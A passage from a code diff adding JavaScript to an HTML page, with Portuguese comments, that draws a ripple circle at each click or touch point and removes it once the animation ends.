+      if (event.type === 'touchstart') {
+        clientX = event.touches[0].clientX;
+        clientY = event.touches[0].clientY;
+      } else {
+        clientX = event.clientX;
+        clientY = event.clientY;
+      }
+
+      // Define o tamanho do círculo com base na tela
+      const size = Math.max(window.innerWidth, window.innerHeight) * 0.05; // Ajuste este valor para maior/menor
+      ripple.style.width = ripple.style.height = `${size}px`;
+
+      // Centraliza o círculo no ponto do clique
+      ripple.style.left = `${clientX - size / 2}px`;
+      ripple.style.top = `${clientY - size / 2}px`;
+
+      document.body.appendChild(ripple);
+
+      // Remove o elemento após a animação para limpar o DOM
+      ripple.addEventListener('animationend', () => {
+        ripple.remove();
+      });
+    }
+  </script>
+</body>
+</html>
